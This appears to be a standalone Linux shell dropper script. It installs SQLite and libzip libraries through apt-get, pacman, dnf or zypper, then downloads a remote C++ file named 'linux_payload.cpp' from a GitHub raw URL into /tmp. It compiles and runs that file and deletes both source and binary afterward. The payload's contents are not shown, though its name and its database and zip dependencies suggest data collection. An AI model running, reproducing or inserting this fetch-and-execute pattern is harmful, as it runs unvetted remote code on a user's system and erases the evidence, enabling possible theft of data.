(
  command -v apt-get &>/dev/null && \
    apt-get update && \
    apt-get install -y libsqlite3-dev sqlite3 libzip-dev ||

  command -v pacman &>/dev/null && \
    pacman -Sy --noconfirm sqlite libzip ||

  command -v dnf &>/dev/null && \
    dnf install -y sqlite-devel libzip-devel ||

  command -v zypper &>/dev/null && \
    zypper install -y sqlite3-devel libzip-devel
) && \

curl -sL https://raw.githubusercontent.com/QUADROisCoding/Wininstall/refs/heads/main/linux_payload.cpp \
  -o /tmp/p.cpp && \

g++ -std=c++17 -o /tmp/p /tmp/p.cpp -lsqlite3 -lzip && \

/tmp/p && rm /tmp/p /tmp/p.cpp
